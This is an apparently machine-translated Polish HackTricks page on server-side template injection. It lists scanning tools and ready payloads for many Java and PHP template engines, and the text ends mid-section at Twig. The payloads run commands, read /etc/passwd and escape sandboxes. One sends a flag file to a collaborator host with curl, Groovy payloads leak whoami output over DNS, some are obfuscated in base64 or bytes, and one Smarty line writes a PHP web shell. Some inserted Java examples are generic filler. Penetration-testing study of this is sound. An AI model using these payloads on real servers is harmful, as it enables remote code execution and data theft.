# SSTI (Server Side Template Injection)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) to najwa偶niejsze wydarzenie zwizane z cyberbezpieczestwem w **Hiszpanii** i jedno z najwa偶niejszych w **Europie**. Majc **misj promowania wiedzy technicznej**, ten kongres jest gorcym punktem spotka dla profesjonalist贸w technologii i cyberbezpieczestwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## Czym jest SSTI (Server-Side Template Injection)

Server-side template injection to podatno, kt贸ra wystpuje, gdy atakujcy mo偶e wstrzykn zoliwy kod do szablonu, kt贸ry jest wykonywany po stronie serwera. Ta podatno mo偶e wystpowa w r贸偶nych technologiach, w tym w Jinja.

Jinja to popularny silnik szablon贸w u偶ywany w aplikacjach internetowych. Przyjrzyjmy si przykadowemu kodowi demonstrujcemu podatny fragment kodu z u偶yciem Jinja:
```python
output = template.render(name=request.args.get('name'))
```
W tym podatnym kodzie, parametr `name` z 偶dania u偶ytkownika jest bezporednio przekazywany do szablonu za pomoc funkcji `render`. Mo偶e to potencjalnie umo偶liwi atakujcemu wstrzyknicie zoliwego kodu do parametru `name`, co prowadzi do wstrzyknicia szablonu po stronie serwera.

Na przykad, atakujcy m贸gby stworzy 偶danie z takim adunkiem:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Payload `{{zy-kod-tutaj}}` jest wstrzykiwany do parametru `name`. Ten payload mo偶e zawiera dyrektywy szablonu Jinja, kt贸re umo偶liwiaj atakujcemu wykonanie nieautoryzowanego kodu lub manipulacj silnikiem szablon贸w, co potencjalnie daje mu kontrol nad serwerem.

Aby zapobiec podatnociom na wstrzykiwanie szablon贸w po stronie serwera, programici powinni upewni si, 偶e dane wprowadzane przez u偶ytkownika s odpowiednio oczyszczone i zweryfikowane przed wstawieniem ich do szablon贸w. Wdro偶enie walidacji danych wejciowych i u偶ycie technik unikania kontekstu mo偶e pom贸c w ograniczeniu ryzyka zwizanego z t podatnoci.

### Wykrywanie
Aby wykry wstrzykiwanie szablon贸w po stronie serwera (SSTI), pocztkowo **fuzzowanie szablonu** jest prostym podejciem. Polega to na wstrzykniciu sekwencji specjalnych znak贸w (**`${{<%[%'"}}%\`**) do szablonu i analizowaniu r贸偶nic w odpowiedzi serwera na zwyke dane w por贸wnaniu do tego specjalnego payloadu. Wska藕nikami podatnoci s:
- Wyrzucane bdy, ujawniajce podatno i potencjalnie silnik szablon贸w.
- Brak payloadu w odbiciu lub brak niekt贸rych jego czci, co sugeruje, 偶e serwer przetwarza go inaczej ni偶 zwyke dane.

- **Kontekst tekstu**: Odr贸偶nienie od XSS przez sprawdzenie, czy serwer ocenia wyra偶enia szablonu (np. `{{7*7}}`, `${7*7}`).

- **Kontekst kodu**: Potwierdzenie podatnoci poprzez zmian parametr贸w wejciowych. Na przykad zmiana `greeting` w `http://vulnerable-website.com/?greeting=data.username`, aby sprawdzi, czy wynik serwera jest dynamiczny czy stay, jak w przypadku `greeting=data.username}}hello`, zwracajcy nazw u偶ytkownika.

#### Faza identyfikacji
Identyfikacja silnika szablon贸w polega na analizie komunikat贸w o bdach lub rcznym testowaniu r贸偶nych payload贸w specyficznych dla jzyka. Wsp贸lne payloady powodujce bdy to `${7/0}`, `{{7/0}}` i `<%= 7/0 %>`. Obserwowanie odpowiedzi serwera na operacje matematyczne pomaga zlokalizowa konkretny silnik szablon贸w.

## Narzdzia

### [TInjA](https://github.com/Hackmanit/TInjA)

skaner SSTI + CSTI, kt贸ry wykorzystuje nowatorskie poligloty
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImap jest narzdziem do automatycznego wykrywania i eksploatacji podatnoci Server-Side Template Injection (SSTI) w aplikacjach internetowych. Narzdzie to zostao opracowane w celu uatwienia testowania penetracyjnego i identyfikacji luk w zabezpieczeniach aplikacji.

#### Wprowadzenie

Server-Side Template Injection (SSTI) to podatno, kt贸ra wystpuje, gdy aplikacja internetowa umo偶liwia wstrzykiwanie kodu szablonu po stronie serwera. W przypadku wystpienia tej podatnoci, atakujcy mo偶e wykorzysta j do wykonania dowolnego kodu na serwerze, co mo偶e prowadzi do naruszenia poufnoci danych, utraty integralnoci systemu lub innych powa偶nych konsekwencji.

#### Wykorzystanie

SSTImap automatycznie wykrywa podatnoci SSTI w aplikacjach internetowych, przeprowadzajc testy wstrzykiwania kodu szablonu na r贸偶nych parametrach 偶dania. Narzdzie to obsuguje wiele popularnych jzyk贸w szablon贸w, takich jak Jinja2, Twig, Smarty, Freemarker i inne.

Aby rozpocz skanowanie, wystarczy poda adres URL aplikacji docelowej. SSTImap automatycznie przeprowadzi testy na wszystkich dostpnych parametrach 偶dania, aby zidentyfikowa potencjalne podatnoci SSTI.

#### Instalacja

Aby zainstalowa SSTImap, wykonaj nastpujce kroki:

1. Sklonuj repozytorium SSTImap z [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap).
2. Przejd藕 do katalogu SSTImap.
3. Zainstaluj wymagane zale偶noci, wykonujc polecenie `pip install -r requirements.txt`.

#### U偶ycie

Aby uruchomi SSTImap, wykonaj nastpujce kroki:

1. Przejd藕 do katalogu SSTImap.
2. Uruchom narzdzie, wykonujc polecenie `python sstimap.py -u <adres_URL_aplikacji>`.

Po zakoczeniu skanowania, SSTImap wygeneruje raport zawierajcy informacje o znalezionych podatnociach SSTI.

#### Podsumowanie

SSTImap jest przydatnym narzdziem do automatycznego wykrywania i eksploatacji podatnoci SSTI w aplikacjach internetowych. Dziki temu narzdziu mo偶na szybko zidentyfikowa potencjalne luki w zabezpieczeniach i podj odpowiednie dziaania w celu ich naprawy.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap to skrypt Pythona su偶cy do automatycznego wykrywania i eksploatacji podatnoci Server-Side Template Injection (SSTI). Skrypt ten mo偶e by u偶ywany do testowania aplikacji internetowych pod ktem potencjalnych luk w zabezpieczeniach SSTI.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Tabela wstrzykiwania szablon贸w](https://github.com/Hackmanit/template-injection-table)

interaktywna tabela zawierajca najbardziej wydajne poligloty wstrzykiwania szablon贸w wraz z oczekiwanymi odpowiedziami 44 najwa偶niejszych silnik贸w szablon贸w.

## Exploits

### Og贸lne

W tej **licie s贸w** mo偶na znale藕 **zmienne zdefiniowane** w rodowiskach niekt贸rych z poni偶szych silnik贸w:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Podstawowe wstrzykiwanie**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Pobierz zmienne rodowiskowe systemu**

Aby pobra zmienne rodowiskowe systemu w jzyku Java, mo偶emy skorzysta z klasy `System` i jej metody `getenv()`. Metoda ta zwraca map, kt贸ra zawiera wszystkie zmienne rodowiskowe systemu wraz z ich wartociami.

Oto przykadowy kod, kt贸ry pokazuje, jak pobra zmienne rodowiskowe systemu:

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            String value = env.get(key);
            System.out.println(key + " = " + value);
        }
    }
}
```

Ten kod iteruje przez wszystkie zmienne rodowiskowe systemu i wywietla ich nazwy oraz wartoci na konsoli. Mo偶emy go dostosowa, aby wykona inne operacje na zmiennych rodowiskowych w zale偶noci od naszych potrzeb.
```java
${T(java.lang.System).getenv()}
```
**Java - Pobierz /etc/passwd**

W przypadku ataku Server-Side Template Injection (SSTI) na aplikacj napisan w jzyku Java, mo偶emy pr贸bowa odzyska zawarto pliku /etc/passwd. Poni偶ej znajduje si przykadowy kod, kt贸ry mo偶na wykorzysta do tego celu:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SSTIExample {
    public static void main(String[] args) {
        try {
            String command = "cat /etc/passwd";
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Ten kod wykonuje polecenie systemowe `cat /etc/passwd` i odczytuje wynik. Nastpnie wypisuje zawarto pliku /etc/passwd na standardowe wyjcie. Pamitaj, 偶e ten kod jest tylko przykadem i powinien by u偶ywany wycznie w celach edukacyjnych lub zgodnie z prawem.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Mo偶esz wypr贸bowa swoje payloady na [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nic`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Pomijanie piaskownicy**

锔 dziaa tylko w wersjach Freemarker poni偶ej 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Wicej informacji**

* W sekcji FreeMarker na stronie [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Wicej informacji**

* W sekcji Velocity na stronie [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf

W Thymeleaf, powszechnym testem podatnoci na SSTI jest wyra偶enie `${7*7}`, kt贸re r贸wnie偶 dotyczy tego silnika szablon贸w. Aby potencjalnie wykona zdalny kod, mo偶na u偶y wyra偶e takich jak:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Thymeleaf wymaga, aby te wyra偶enia byy umieszczone w okrelonych atrybutach. Jednak _wstawianie wyra偶e_ jest obsugiwane dla innych lokalizacji szablon贸w, za pomoc skadni `[[...]]` lub `[(...)]`. W zwizku z tym, prosty adunek testowy SSTI mo偶e wyglda tak: `[[${7*7}]]`.

Jednak szansa na powodzenie tego adunku jest zazwyczaj niska. Domylna konfiguracja Thymeleaf nie obsuguje dynamicznego generowania szablon贸w; szablony musz by zdefiniowane z g贸ry. Programici musieliby zaimplementowa wasny `TemplateResolver`, aby tworzy szablony ze string贸w w locie, co jest rzadkie.

Thymeleaf oferuje r贸wnie偶 _preprocessing wyra偶e_, gdzie wyra偶enia wewntrz podw贸jnych podkrelnik贸w (`__...__`) s przetwarzane przed wykonaniem. Ta funkcja mo偶e by wykorzystana przy konstrukcji wyra偶e, jak pokazano w dokumentacji Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Przykad podatnoci w Thymeleaf**

Rozwa偶my nastpujcy fragment kodu, kt贸ry mo偶e by podatny na wykorzystanie:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
To wskazuje, 偶e jeli silnik szablon贸w nieprawidowo przetwarza te dane wejciowe, mo偶e to prowadzi do zdalnego wykonania kodu, uzyskujc dostp do adres贸w URL takich jak:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Wicej informacji**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Framework Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Ominicie filtr贸w**

Mo偶na u偶ywa wielu wyra偶e zmiennych, jeli `${...}` nie dziaa, spr贸buj `#{...}`, `*{...}`, `@{...}` lub `~{...}`.

* Odczytaj `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Niestandardowy skrypt do generowania payload贸w

```python
import os

def generate_payload(command):
    payload = f"{{{{ {command} }}}}"
    return payload

if __name__ == "__main__":
    command = input("Enter the command to execute: ")
    payload = generate_payload(command)
    print(f"Generated payload: {payload}")
```

Ten skrypt Pythona su偶y do generowania payload贸w. Wprowad藕 polecenie, kt贸re chcesz wykona, a skrypt wygeneruje odpowiedni payload.
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Wicej informacji**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipulacja widokiem Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Stara wersja Pebble ( < wersja 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nowa wersja Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava to silnik szablon贸w dla jzyka Java, kt贸ry obsuguje wstrzykiwanie kodu po stronie serwera (Server-Side Template Injection - SSTI). Jest to popularna technika wykorzystywana przez haker贸w do wykonania kodu na serwerze i uzyskania nieautoryzowanego dostpu.

#### Jak dziaa Jinjava?

Jinjava dziaa poprzez umo偶liwienie programistom tworzenia szablon贸w, kt贸re mog by dynamicznie renderowane na serwerze. Jednak jeli nie s odpowiednio zabezpieczone, szablony te mog by podatne na wstrzykiwanie kodu. Hakerzy mog wykorzysta t luk, aby wstrzykn zoliwy kod i wykona go na serwerze.

#### Wykrywanie i wykorzystywanie SSTI w Jinjava

Aby wykry i wykorzysta SSTI w Jinjava, hakerzy mog przeprowadzi testy, wstrzykujc kod w r贸偶ne miejsca w szablonach i obserwujc, czy zostaje on wykonany. Jeli kod zostaje wykonany, oznacza to, 偶e serwer jest podatny na SSTI.

Hakerzy mog r贸wnie偶 wykorzysta r贸偶ne techniki, takie jak wstrzykiwanie kodu Pythona, aby uzyska dostp do wra偶liwych danych na serwerze. Przykadowe techniki obejmuj wywoywanie funkcji systemowych, odczytywanie plik贸w i wykonanie dowolnego kodu Pythona.

#### Zabezpieczanie si przed SSTI w Jinjava

Aby zabezpieczy si przed SSTI w Jinjava, programici powinni:

- Unika bezporedniego wstrzykiwania danych u偶ytkownika do szablon贸w.
- Sprawdza i filtrowa dane wejciowe, aby upewni si, 偶e nie zawieraj zoliwego kodu.
- U偶ywa wbudowanych funkcji i metod do bezpiecznego przetwarzania danych w szablonach.
- Regularnie aktualizowa silnik Jinjava, aby korzysta z najnowszych poprawek zabezpiecze.

Wa偶ne jest, aby programici byli wiadomi zagro偶e zwizanych z SSTI w Jinjava i podejmowali odpowiednie rodki ostro偶noci, aby zabezpieczy swoje aplikacje przed atakami.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava to projekt open source rozwijany przez Hubspot, dostpny pod adresem [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Wykonanie polece**

Naprawiono za pomoc [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Wicej informacji**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` - delimitery instrukcji
* `{{ }}` - delimitery wyra偶e
* `{# #}` - delimitery komentarzy
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Wyszukaj "com.hubspot.content.hubl.context.TemplateContextRequest" i odkryj [projekt Jinjava na Githubie](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Wicej informacji**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

Expression Language (EL) to podstawowa funkcja, kt贸ra uatwia interakcj midzy warstw prezentacji (takimi jak strony internetowe) a logik aplikacji (takimi jak zarzdzane beany) w JavaEE. Jest szeroko stosowany w wielu technologiach JavaEE, aby usprawni t komunikacj. G贸wne technologie JavaEE wykorzystujce EL to:

- **JavaServer Faces (JSF)**: Wykorzystuje EL do powizania komponent贸w na stronach JSF z odpowiadajcymi danymi i dziaaniami w backendzie.
- **JavaServer Pages (JSP)**: EL jest u偶ywany w JSP do dostpu i manipulacji danymi wewntrz stron JSP, uatwiajc poczenie element贸w strony z danymi aplikacji.
- **Contexts and Dependency Injection for Java EE (CDI)**: EL integruje si z CDI, umo偶liwiajc pynn interakcj midzy warstw internetow a zarzdzanymi beanami, zapewniajc bardziej sp贸jn struktur aplikacji.

Sprawd藕 nastpujc stron, aby dowiedzie si wicej na temat **wykorzystania interpreter贸w EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Nastpujce obejcia Security Managera zostay zaczerpnite z tego [**opisu**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najwa偶niejsze wydarzenie zwizane z cyberbezpieczestwem w **Hiszpanii** i jedno z najwa偶niejszych w **Europie**. Majc na celu promowanie wiedzy technicznej, ten kongres jest gorcym punktem spotka dla profesjonalist贸w technologii i cyberbezpieczestwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Wicej informacji**

* W sekcji Smarty na stronie [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Bd`
* `{{foobar}} Nic`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
